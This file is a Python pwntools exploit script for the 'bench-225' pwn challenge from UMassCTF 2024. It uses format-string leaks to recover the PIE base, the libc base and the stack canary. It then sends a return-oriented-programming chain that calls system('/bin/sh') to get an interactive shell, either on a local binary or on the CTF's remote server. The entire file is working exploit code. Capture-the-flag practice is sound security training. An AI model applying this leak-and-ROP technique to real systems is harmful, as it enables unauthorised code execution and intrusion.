#!/usr/bin/env python3
from pwn import *
import sys, os

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/UMassCTF 2024/pwn/bench-225/bench-225')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def attach(r):
    if not REMOTE:
        bkps = ['*motivation']
        cmds = []

        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)

    for x in range(5):
        r.sendlineafter(b'Plate\n', b'3')

    for x in range(6):
        r.sendlineafter(b'Plate\n', b'4')

    r.sendlineafter(b'Plate\n', b'6')
    r.sendlineafter(b'quote: ', b'%23$p')
    r.recvuntil(b'Quote: "')

    main = int(r.recvuntil(b'"')[:-1].decode(), 16)
    pie_base = main - elf.sym['main']

    r.sendlineafter(b'Plate\n', b'6')
    r.sendlineafter(b'quote: ', b'%15$p')
    r.recvuntil(b'Quote: "')

    main_ret = int(r.recvuntil(b'"')[:-1].decode(), 16)
    libc_base = main_ret - libc.libc_start_main_return
    log.info(f'main_ret: {hex(main_ret)}')
    pause()

    r.sendlineafter(b'Plate\n', b'6')
    r.sendlineafter(b'quote: ', b'%9$p')
    r.recvuntil(b'Quote: "')

    canary = int(r.recvuntil(b'"')[:-1].decode(), 16)
    pop_rdi = pie_base + 0x1336
    ret = pie_base + 0x101a
    binsh = libc_base + next(libc.search('/bin/sh\0'))
    system = libc_base + libc.sym['system']

    r.sendlineafter(b'Plate\n', b'6')
    r.sendlineafter(b'quote: ', cyclic(8) + p64(canary) + cyclic(8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv)==2 and sys.argv[1]=='remote':
        REMOTE = True
        r = remote('bench-225.ctf.umasscybersec.org', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
